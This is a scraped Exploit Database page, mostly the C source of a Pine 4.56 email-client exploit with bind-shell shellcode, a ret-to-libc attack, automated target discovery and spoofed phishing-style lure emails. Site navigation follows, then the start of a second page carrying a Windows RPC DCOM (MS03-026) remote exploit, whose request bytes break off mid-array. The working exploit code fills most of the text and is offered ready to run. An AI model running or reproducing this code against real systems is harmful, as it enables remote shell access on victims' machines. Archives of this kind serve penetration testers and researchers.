="\x31\xc9\xf7\xe1\xb0\x02\xcd\x80\x39\xc8\x74\x05\x31\xc0\x40\xcd\x80\x31""\xc0\xb0\x06\x50\xb0\x01\x50\x89\xc3\x40\x50\xb0\x66\x89\xe1\xcd\x80\x89""\xc2\x31\xdb\x53\x66\xb9\x1a\x1a\xc1\xe1\x10\xb1\x02\x51\x89\xe1\x6a\x10""\x51\x52\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x52\x89\xe1\xb0\x66\xb3""\x04\xcd\x80\x31\xc0\x50\x50\x52\x89\xe1\xb0\x66\x43\xcd\x80\x89\xc7\x89""\xd3\x89\xc1\xb0\x06\x89\xc8\x31\xd2\x52\x68\x70\x74\x6d\x78\x68\x64\x65""\x76\x2f\x68\x2f\x2f\x2f\x2f\x31\xc9\xb1\x02\x89\xe3\xb0\x05\xcd\x80\x89""\xc6\x52\x89\xe2\xb9\x31\x54\x04\x40\x89\xf3\xb0\x36\xcd\x80\x89\xe2\xb9""\x30\x54\x04\x80\xb0\x36\xcd\x80\x59\x83\xc1\x30\xc1\xe1\x18\xba\x01\x74""\x73\x2f\xc1\xea\x08\x01\xca\x31\xc9\x51\x52\x31\xd2\x68\x65\x76\x2f\x70""\x68\x2f\x2f\x2f\x64\xb1\x02\x89\xe3\xb0\x05\xcd\x80\x89\xc2\xb0\x02\xcd""\x80\x31\xc9\x39\xc8\x75\x3f\xb0\x42\xcd\x80\xb1\x03\x31\xc0\x89\xd3\xb0""\x3f\x49\xcd\x80\x41\xe2\xf8\x89\xd3\xb0\x06\xcd\x80\x89\xf3\xb0\x06\xcd""\x80\x89\xfb\xb0\x06\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e""\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x89\xd3""\x31\xc0\xb0\x06\xcd\x80\x83\xec\x50\x31\xc9\xf7\xe1\x31\xdb\x89\xf9\x43""\xd3\xe3\x01\xd8\x89\xf1\x31\xdb\x43\xd3\xe3\x01\xd8\x50\x89\xda\x89\xcb""\x43\x89\xe1\x52\x57\x56\x31\xff\x31\xf6\x31\xc0\x99\xb0\x8e\xcd\x80\x5e""\x5f\x5b\x58\x21\xd8\x31\xdb\x39\xc3\x75\x1b\xb2\x50\x89\xe1\x89\xfb\x31""\xc0\xb0\x03\xcd\x80\x83\xf8\x01\x7c\x26\x89\xc2\x89\xf3\xb0\x04\xcd\x80""\xeb\xad\xb2\x50\x89\xe1\x89\xf3\x31\xc0\xb0\x03\xcd\x80\x83\xf8\x01\x7c""\x0b\x90\x89\xc2\x89\xfb\xb0\x04\xcd\x80\xeb\x91\x31\xc0\x40\xcd\x80";/* cause a break and have a "test" number to check */char testsc[] = "\xcc\x01\x02\x03\x04";struct bss {int start;int end;};char mail[6666];	/* this is basically the "egg" */void die(int i, char *m) {if(i)perror(m);elseprintf("%s\n",m);exit(0);}/** prepare boring part of email**/void prepare_mail(char *from, char *sub, char *to) {snprintf(mail,sizeof(mail),"From: %s\n""Subject: %s\n""To: %s\n""MIME-Version: 1.0\n""Content-Type: multipart/related;\n"" type=\"multipart/alternative\";\n"" boundary=sorbo-rox\n\n""--sorbo-rox\n",from,sub,to);}/** ok here da tricky bit* arg: number of bytes (distance)** it returns a positive unsigned int* that becomes negative when singed* that when *4 becomes signed* matching our distance* yeah kinda dirty... i hate numbers ;D* w00t**/unsigned int num(int dist) {int tmp = -1-dist;unsigned int border = tmp;int neg = (border/4)*(-1);unsigned int res;res = 0xffffffff+neg;return res;}/** ret-to-libc system() grsex 0wned** we overwrite ebp* we control esp (heap)* we make stack perfect and make it ret to system*** conditions plist must be writable (bss is ok)* we must know addr of ptr to our command (bss is fixed)** NOTE: segfault after shell is NORMAL since it will return to plist addr**/void own_hard(int sys, int plist, int cmd, int dist, char *command) {char egg[1024];int *ptr = (int*)&egg[0];*ptr = 0x41414141; /* ebp */ptr++;*ptr = sys; /* system */ptr++;*ptr = plist; /* ret /  plist */ptr++;*ptr = cmd; /* /bin/sh */ptr++;*ptr = 0;/* practice: exploit this exploit =D */sprintf(mail+strlen(mail),"Content-Type: message/external-body;\n"" access-type=\"%s\";\n"" charset*%u*=\"%s\";\n""Content-Transfer-Encoding: 8bit\n""--sorbo-rox--\n",command,num(dist), egg);}/** we overwrite ret addr and own it* no offset needed since we control area pointer by ret directly* well we do need the stack distance from params to eip**/void own_easy(int dist, char *s) {/* practice: exploit this exploit =D */sprintf(mail+strlen(mail),"Content-Type: text/html;\n"" charset*%u*=\"%s\";\n""Content-Transfer-Encoding: 8bit\n""--sorbo-rox--\n",num(dist), s);}/* create a lame pinerc */void pinerc() {int pid;pid = fork();if(pid == -1)die(1,"fork()");if(!pid) {char *arg[] = { "pine","-p","/tmp/pinerc", NULL };close(1);close(2);execve(PINE,arg,NULL);die(1,"execve()");}else {sleep(1);kill(pid,SIGKILL);wait(NULL);}if(system("grep -v inbox-path /tmp/pinerc > /tmp/o ""&& mv /tmp/o /tmp/pinerc && ""echo inbox-path=/tmp/meil >> /tmp/pinerc")<0)die(1,"system()");}void write_mail(char *path) {FILE *f;f = fopen(path,"w");if(!f)die(1,"fopen()");if(fprintf(f,"From sorbo  Tue Nov 29 00:00:00 1983\n%s",mail) < 1)die(1,"fprintf()");fclose(f);}char *line;/* get a free tty */int getty(int *master, int *slave) {if ((*master = open("/dev/ptmx", O_RDWR)) == -1)return -1;if (grantpt(*master) == -1 ||unlockpt(*master) == -1 ||(line = (char*)ptsname(*master)) == NULL ||(*slave = open(line, O_RDWR)) == -1) {close(*master);return -1;}return 0;}/* fire up debugged process (and continue && wait) */int start_debug(int cont) {int pid = fork();int slave,master;/* we associate it to tty cuz ncurses fucks up screen */if( getty(&master,&slave) == -1)die(0,"getty()");if(pid == -1)die(1,"fork()");/* child */if(!pid) {char *arg[] = { "pine", "-p","/tmp/pinerc","-I","l,>,>,<,<,q,y",NULL };if(ptrace(PTRACE_TRACEME,NULL,NULL)==-1)die(1,"ptrace()");if ((pid = open(line, O_RDWR)) == -1)die(1,"open()");dup2(pid,0);close(1);close(2);execv(PINE,arg);die(1,"execve()");}else {wait(NULL);if(cont) {if(ptrace(PTRACE_CONT,pid,0,0) == -1)die(1,"ptrace()");wait(NULL);}}return pid;}void stop_debug(int pid) {if(ptrace(PTRACE_KILL,pid,0,0) == -1)die(1,"ptrace()");wait(NULL);}/** 0 = nope* 1 = yea* duh ;D**/int test_dist() {struct user_regs_struct regs;int x;int pid = start_debug(1);if(ptrace(PTRACE_GETREGS,pid,NULL,&regs)==-1)return 0;	/* exited normally prolly *///                printf("EIP=%x\n",regs.eip);x = ptrace(PTRACE_PEEKTEXT,pid,regs.eip,NULL);if(x == -1 && errno != 0 && errno != EIO)die(1,"ptrace()");//		printf("INSTR=%x\n",x);stop_debug(pid);if(x == *((int*)&testsc[1]))return 1;return 0;}/* popen and get line */char *getShit(char *cmd) {FILE *f;static char buff[1024];f = popen(cmd,"r");if(f == NULL) {perror("popen");exit(0);}buff[0] = 0;fgets(buff,sizeof(buff),f);pclose(f);return &buff[0];}/* get a number from a popen */int getInt(char *p) {char *ptr = getShit(p);int ret = 0;if(sscanf(ptr,"%x",&ret)!=1) {printf("Error in getting addr\n");exit(0);}return ret;}/* get start and end of bss */struct bss getbss() {struct bss b;b.start = getInt("objdump --headers "PINE" | grep \" .bss\" | awk '{print $4}'");b.end =  getInt("objdump --headers "PINE" | grep \" .bss\" | awk '{print $3}'");b.end += b.start;return b;}/* find our buff (command) in the process memory .bss */int findbuf(int ebp) {struct bss b;int pid;int cmd = 0x12345678;int addr;int ret = -1;struct user_regs_struct regs;int x;b = getbss();printf(".bss START =0x%.8x END=0x%.8x\n",b.start,b.end);prepare_mail("from","subj","to");own_hard(0x41414141,b.start,b.start,ebp,(char*)&cmd);write_mail("/tmp/meil");addr = b.start;pid = start_debug(1);if(ptrace(PTRACE_GETREGS,pid,NULL,&regs)==-1)return -1;	/* exited normally prolly *///        printf("EIP=%x\n",regs.eip);if(regs.eip != 0x41414141)return -1;for(addr = b.start; addr < b.end; addr++) {printf("Checking 0x%.8x\r",addr);fflush(stdout);x = ptrace(PTRACE_PEEKTEXT,pid,addr,NULL);if(x == -1 && errno != 0)die(1,"ptrace()");if(x == cmd) {ret = addr;break;}}stop_debug(pid);putchar('\n');return ret;}/* get system from libc */int getSystem() {int base;int offset;char tmp[1024*2];char libc[512];/* binary specific */base = getInt("ldd " PINE" | grep \"libc\\.\" | awk '{print $4}' | tr -d \"()\"");//        printf("GLIBC base addr 0x%.8x\n",base);/* get libc path */snprintf(libc,sizeof(libc),"%s",getShit("ldd " PINE" | grep \"libc\\.\" | awk '{print $3}'"));if(strlen(libc) <2) {printf("can't get libc location\n");exit(0);}libc[strlen(libc)-1] = 0;/* lib specific */snprintf(tmp,sizeof(tmp),"objdump -T %s | grep \\ system | ""awk '{print $1}' ",libc);offset = getInt(tmp);//       printf("GLIBC __libc_system offset 0x%.8x\n",offset);offset += base;//      printf("system() addr 0x%.8x\n",offset);return offset;}/* check if offset contains non usable chars */int isUsable(int x) {int i,j;for(i = 0; i < sizeof(x); i++)for(j =0; j < sizeof(nonusable); j++)if( *(((unsigned char*)&x)+i) == nonusable[j])return 0;return 1;}/* get various system offsets */int *getSystemOffsets() {static int off[3];int pid;int x;off[0] = getSystem();off[1] = getInt("objdump -T "PINE" | grep system | awk '{print $1}'");off[2] = getInt("objdump -R "PINE" | grep system | awk '{print $1}'");pid = start_debug(0);x = ptrace(PTRACE_PEEKTEXT,pid,off[2],NULL);if(x == -1 && errno != 0)die(1,"ptrace()");off[2] = x;stop_debug(pid);return &off[0];}/* get target from local pine */struct target_info getTarget() {struct target_info target;int *sysa;int i;char os[512];/* get a description of target */snprintf(os,sizeof(os),getShit("uname -sr | tr -d '\n'"));snprintf(target.desc,sizeof(target.desc),"%s Pine %s",os,getShit(PINE" -v | awk '{print $2}' | tr -d '\n'"));printf("Trying to own: %s\n",target.desc);pinerc();/* find stack dist from params -> eip */printf("Searching stack distance\n");for(target.dist = 4; target.dist < 1024; target.dist+=4) {prepare_mail("from","subj","to");own_easy(target.dist,testsc);write_mail("/tmp/meil");printf("Testing target.dist %d\r",target.dist);fflush(stdout);if(test_dist())break;}printf("\n");if(target.dist == 1024)die(1,"Can't find dist");printf("DIST=%d\n\n",target.dist);printf("Ok theoretically we can exploit it the easy way\n""looking for hard way shit now\n\n");/* find our buffer on bss ebp should b eip-4 */target.buff = findbuf(target.dist-4);target.method = 0;if(target.buff != -1) {target.method = 1;if(!isUsable(target.buff) || !isUsable(target.buff-PLIST))die(0,"TODO: addr not usuable... trivial to fix");printf("Our command will lie in 0x%.8x\n\n",target.buff);/* find usable system() addr */printf("Obtaining system() addr list\n");sysa = getSystemOffsets();for(i = 0; i < 3; i++) {int usable = isUsable(sysa[i]);printf("System %d:0x%.8x %s\n",i,sysa[i],usable?"OK":"NOT OK");if(usable)target.sys = sysa[i];}printf("Will use 0x%.8x\n\n",target.sys);}elseprintf("Unable to do things the hard way =(\n");unlink("/tmp/pinerc");unlink("/tmp/meil");printf("Summary of targets for this system:\n""{ \"%s\",0,%d,0,0},\n",target.desc,target.dist);if(target.method)printf("{ \"%s\",1,%d,0x%.8x,0x%.8x}\n",target.desc,target.dist-4,target.buff,target.sys);return target;}/* yeah kids luv this */void skriptkiddie_s0lar() {char *mbox;FILE *f;struct target_info target;printf("O shit... is it s0lar running this exp again?\n""not even a -h? ok lets make her happy and make everyhing magically work\n""WARNING: need write axx on /tmp and use of gdb (no grsec high)\n\n");target  = getTarget();mbox = (char*)getenv("MAIL");if(!mbox)die(0,"getenv()");printf("Attempting to write mails to %s\n",mbox);f = fopen(mbox,"a");if(!f)die(1,"fopen()");/* first mail (easy) */prepare_mail("Andrei Koymaski <andrei gay ru>","Easy method portbind 6682","Gustavo Lamazza <gustavo gay it>");own_easy(target.dist,shellcode);if(fprintf(f,"From sorbo Tue Nov 29 00:00:00 1983\n%s\n",mail)<1)die(1,"fprintf()");/* second mail (hard)* we run vi and then* :!/bin/sh* cuz we don't have enough space to make a bindshell and shit*/if(target.method) {prepare_mail("Osama Bin Laden <osama al-quaeda ar>","Hard method (owns grsec) portbind 6682 with vi... spawn shell from vi","George Bush <george whitehouse gov>");own_hard(target.sys,target.buff-PLIST,target.buff,target.dist-4,lame_cmd);if(fprintf(f,"From sorbo Tue Nov 29 00:00:00 1983\n%s\n",mail)<1)die(1,"fprintf()");}printf("You should have mail... read with pine and see if this"" crap worx\n");printf("Enjoy.... s0lar ti amo\n");exit(0);}void listTargets() {int i;printf( "Id\tDescription\tMethod\tDist\tBuff\t\tsystem()\n""========================================================================\n");for(i =0; i < sizeof(targets)/sizeof(struct target_info); i++) {printf("%d\t%s\t%s\t%d\t0x%.8x\t0x%.8x\n",i,targets[i].desc,targets[i].method?"hard":"easy",targets[i].dist,targets[i].buff,targets[i].sys);}}/* own a target */void own(struct target_info t,char *from,char *sub,char *to) {prepare_mail(from,sub,to);/* hard */switch(t.method) {case 1:own_hard(t.sys,t.buff-PLIST,t.buff,t.dist,lame_cmd);break;case 0:own_easy(t.dist,shellcode);break;default:die(0,"Unknown ownage method");}printf("%s",mail);}void usage(char *m) {printf("Usage: %s <opts>\n""-h\tthis lame message\n""-f\tfrom\n""-t\tto\n""-s\tsub\n""-o\ttarget\n""-m\tmethod 0:easy 1:hard(grsex)\n""-d\tdist\n""-b\tbuff\n""-l\tsystem\n\n",m);listTargets();}int main(int argc, char *argv[]) {char from[512];char to[512];char sub[512];int opt;struct target_info t;struct target_info *target = &t;	/* we shall own this */strcpy(from,"Justin Time <admin playboy com>");strcpy(to,"You <winners playboy com>");strcpy(sub,"You are selected! Come get your FREE playboy.com account");t.method = -1;t.buff = 0;t.sys = 0;t.dist = 0;fprintf(stderr,"(remote?) Pine <= 4.56 exploit ""by sorbo (sorbox yahoo com)\np s  grsec won't save you =(\n\n");if(argc<2)skriptkiddie_s0lar();while( (opt = getopt(argc,argv,"hf:t:s:o:m:d:b:l:")) != -1) {switch(opt) {default:case 'h':usage(argv[0]);exit(0);case 'm':t.method = atoi(optarg);break;case 'd':t.dist = atoi(optarg);break;case 'b':if(sscanf(optarg,"%x",&t.buff) != 1)die(0,"Can't parse buff addr");break;case 'l':if(sscanf(optarg,"%x",&t.sys) != 1)die(0,"Can't parse sys addr");break;case 'f':/* does snprintf put the 0 at end if arg* barely fits ? i never really looked into* this... hope it does! ;D*/snprintf(from,sizeof(from),"%s",optarg);break;case 't':snprintf(to,sizeof(to),"%s",optarg);break;case 's':snprintf(sub,sizeof(sub),"%s",optarg);break;case 'o': {unsigned int o = atoi(optarg);if(o >=sizeof(targets)/sizeof(struct target_info))die(0,"Target outta range");target = &targets[o];break;}}}/* check if we got all we need */if(target == &t) {if(!t.dist)die(0,"provide dist");if(t.method == 1)if(!t.buff || !t.sys)die(0,"buff or sys not provided");}/* go for it */own(*target,from,sub,to);exit(0);}// milw0rm.com [2003-09-16]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 100
Microsoft Windows - 'RPC DCOM' Long Filename Overflow (MS03-026) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Long Filename Overflow (MS03-026)EDB-ID:100CVE:2003-0352EDB Verified:Author:ey4sType:remoteExploit:/Platform:WindowsDate:2003-09-16Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#include <stdio.h>#include <winsock2.h>#include <windows.h>#include <process.h>#include <string.h>#include <winbase.h>#pragma comment(lib,"ws2_32")unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0